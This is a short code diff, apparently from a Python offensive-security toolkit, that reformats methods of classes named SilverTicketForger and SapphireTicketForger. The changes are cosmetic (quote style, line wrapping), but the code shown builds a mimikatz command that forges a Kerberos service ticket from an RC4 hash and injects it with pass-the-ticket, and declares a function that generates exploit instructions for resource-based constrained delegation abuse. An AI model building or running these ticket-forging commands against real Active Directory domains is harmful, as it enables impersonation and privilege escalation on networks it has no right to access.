@@ -244,11 +244,11 @@ class SilverTicketForger:
     def _mimikatz_inject_command(self, config: SilverTicketConfig) -> str:
         ntlm = config.service_key_hex or "HASH"
         return (
-            f"mimikatz.exe \"kerberos::golden /domain:{config.domain} "
+            f'mimikatz.exe "kerberos::golden /domain:{config.domain} '
             f"/sid:{config.domain_sid} /target:{config.target_service} "
             f"/service:{config.target_service.split('/')[0]} "
             f"/rc4:{ntlm} /user:{config.username} /id:{config.user_rid} "
-            f"/ptt\" exit"
+            f'/ptt" exit'
         )
 
     def _impacket_command(self, config: SilverTicketConfig) -> str:
@@ -527,7 +527,9 @@ class SapphireTicketForger:
             "req_body": req_body,
         }
 
-    def forge_rbcd(self, machine_account_hash: str, target_service: str, domain: str, username: str = "Administrator") -> dict[str, Any]:
+    def forge_rbcd(
+        self, machine_account_hash: str, target_service: str, domain: str, username: str = "Administrator"
+    ) -> dict[str, Any]:
         """Generate exploit instructions for resource-based constrained delegation.
 
         Args:
